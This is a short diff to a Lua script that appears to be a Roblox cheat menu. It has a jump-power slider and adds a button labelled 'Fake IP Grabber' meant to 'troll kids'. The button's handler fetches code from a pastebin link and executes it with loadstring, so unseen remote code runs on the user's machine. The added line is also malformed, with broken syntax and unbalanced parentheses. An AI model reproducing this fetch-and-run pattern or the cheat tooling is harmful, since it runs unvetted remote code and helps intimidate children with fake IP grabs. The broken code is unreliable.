@@ -51,3 +51,8 @@ end)
 MainSection:NewSlider("Gravity", "Gives you more jump power.", 350, 50, function(s)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
 end)
+
+
+MainSection:NewButton("Fake IP Grabber", "troll kids", function()
+   loadstring:HttpGet("https://pastebin.com/3uHfkQwS"))()
+end)
